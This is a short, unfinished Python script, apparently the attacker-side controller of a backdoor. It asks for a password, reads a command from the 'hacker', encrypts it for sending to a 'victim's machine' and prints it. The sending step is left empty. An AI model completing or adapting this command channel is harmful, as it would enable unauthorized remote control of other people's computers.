# ###################################################################
# hck.py 
# 
# main functions:
#	- get input from hacker (cmd)
#	- 
# ###################################################################
from scapy.all import *
from encrypt import *
import argparse
import sys

pw = ""

def main():
	global pw
	# ask for the password for encryption
	pw = raw_input("Set a password for encryption: ")

	# get command	
	cmd = raw_input("# ")
	# encrypt the command before sending it to victim's machine
	enc_cmd = encrypt(cmd, pw)
	print enc_cmd

	# send to victim
	


if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print("Terminate signal received. Exiting...")